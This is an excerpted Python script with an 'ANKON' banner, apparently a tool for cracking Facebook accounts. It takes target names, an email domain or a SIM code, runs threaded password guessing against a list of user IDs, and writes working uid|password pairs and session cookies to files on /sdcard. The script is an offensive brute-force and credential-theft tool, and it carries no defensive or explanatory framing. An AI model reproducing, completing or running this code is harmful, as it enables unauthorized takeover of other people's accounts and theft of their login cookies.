...
\x1b[1;93m                ___      .__   __.  __  ___   ______   .__   __. 
       /   \     |  \ |  | |  |/  /  /  __  \  |  \ |  | 
      /  ^  \    |   \|  | |  '  /  |  |  |  | |   \|  | 
     /  /_\  \   |  . `  | |    <   |  |  |  | |  . `  | 
    /  _____  \  |  |\   | |  .  \  |  `--'  | |  |\   | 
...
def v1():
    ...
    os.system('clear')
    print(logo)
    kode = input(' [ðŸ”¥]  TERGET FIRST NAME : ')
    kodex = input(' [ðŸ”¥] TERGET LAST NAME :  ')
    print(' [ðŸ¤] example Doamin : @gmail.com, @yahoo.com ')
    doamin = input(' [ðŸ“§]  Input Doamin  : ')
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        print(f"\033[1;97m [ðŸ”¥]  Target Doamin:\033[1;92m {doamin}")
        print(' \033[1;97m[ðŸ”¥]  The process has been started')
        print(' [ðŸ”¥]  Wait for ids ')
        print(50*'_')
        for guru in user:
...
def v2():
    ...
    print(logo)
    kode = input(' [ðŸ”¥]  TERGET FIRST NAME : ')
    kodex = input(' [ðŸ”¥] TERGET FIRST NAME :  ')
    doamin = '.'
...
def v3():
    ...
    kode = input(' [ðŸ“ž] ENTER SIM CODE: ')
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        print(f"\033[1;33m[â™¥]  YOUR TERGET CRACK MENU:\033[1;92m {doamin}")
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mANKON\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[ANKON-OKðŸŒ»] {uid}|{ps}")
                print(f"\n[COOKIEðŸŽ] : {coki}")
                open('/sdcard/ANKON/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[ANKON-CPâŒ] {uid}|{ps}")
                open('/sdcard/ANKON-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[ANKONðŸ’¥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()